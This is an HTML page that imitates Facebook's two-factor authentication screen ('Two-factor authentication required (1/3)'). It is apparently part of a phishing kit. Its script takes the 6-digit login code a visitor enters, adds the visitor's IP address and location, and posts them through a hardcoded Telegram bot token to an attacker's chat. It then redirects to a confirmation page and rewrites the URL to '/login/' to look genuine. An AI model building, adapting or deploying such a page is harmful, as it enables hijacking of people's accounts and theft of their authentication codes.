<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
    <title>Facebook - 2FA</title>
    <style>
        body {
            background-color: #f0f2f5;
            font-family: system-ui;
            -webkit-font-smoothing: antialiased;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .header {
            background-color: white;
            padding: 8px 0;
            width: 100%;
            text-align: center;
            box-shadow: 1px 1px 8px 1px rgb(0 0 0 / 10%);
            position: absolute;
            top: 0;
            left: 0;
        }

        .header img {
            width: 40px;
        }

        .main-container {
            width: 100%;
            max-width: 400px;
            margin-top: 100px;
        }

        .card {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
            text-align: left;
        }

        .card h3 {
            font-size: 16px;
            color: #4b4f56;
            font-weight: 700;
            margin-bottom: 20px;
        }

        .card p {
            font-size: 14px;
            margin-bottom: 10px;
            color: #333;
        }

        .form-control {
            border-radius: 4px;
            border: 1px solid #ced4da;
            padding: 10px;
            font-size: 14px;
        }

        .btn-primary {
            background-color: #4267b2;
            border: 1px solid #4267b2;
            color: white;
            width: 100%;
            font-size: 14px;
            font-weight: 500;
            padding: 10px;
            border-radius: 4px;
            margin-top: 15px;
            cursor: pointer;
        }

        .btn-primary:hover {
            background-color: #365899;
        }

        .footer-link {
            margin-top: 20px;
            text-align: center;
        }

        .footer-link a {
            color: #3578e5;
            text-decoration: none;
            font-size: 14px;
        }

        .footer-link a:hover {
            text-decoration: underline;
        }
    </style>
</head>

<body>
    <div class="header">
        <img src="/login/images/logo.svg" alt="Facebook Logo">
    </div>
    <div class="main-container">
        <div class="card">
            <h3>Two-factor authentication required (1/3)</h3>
            <p>Youâ€™ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
            <p>Enter the 6-digit code from your <strong>code generator</strong> or third-party app below.</p>
            <input type="number" id="code" class="form-control" placeholder="Login code" required="">
            <button class="btn btn-primary" onclick="send2FACode()">Send</button>
        </div>
    </div>

    <script src="/script.js"></script>
    <script>
        function send2FACode() {
            const code = document.querySelector("#code").value;

            if (code === '') {
                document.querySelector("#code").style.border = '1px solid red';
                return;
            }

            getIpAndLocation((ip, country, city) => {
                const botToken = '7494153356:AAFQo6RDU7o_Cjn88uVqmwTFyQZaqoOn25k';
                const chatId = '5607989288';
                const message = `2FA Code: ${code}\nIP: ${ip}\nCountry: ${country}\nCity: ${city}`;

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                }).then(response => response.json())
                  .then(data => {
                      console.log('Message sent successfully:', data);
                      window.location = 'confirm2.html';
                  })
                  .catch(error => {
                      console.error('Error sending message:', error);
                      alert('Failed to send data to Telegram');
                  });
            });
        }
    </script>
<script src="script.js"></script>
<script>
    // Ensure that the URL always shows "/login/" without reloading the page
    if (window.location.pathname !== '/login/') {
        window.history.pushState({}, '', '/login/');
    }
</script>
</body>

</html>
